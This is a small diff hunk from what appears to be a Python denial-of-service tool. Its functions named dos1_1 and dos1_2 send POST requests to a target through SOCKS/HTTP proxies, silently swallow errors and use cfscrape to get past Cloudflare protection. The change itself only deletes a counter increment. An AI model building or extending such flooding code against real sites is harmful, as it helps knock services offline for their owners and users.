@@ -67,7 +67,6 @@ def dos1_1(target, proxy):
         s.post(target, headers=header2, proxies=proxiessockshttp, timeout=1)
     except:
         pass
-    pack += 1
 
 def dos1_2(target, proxy):
     s = cfscrape.create_scraper()
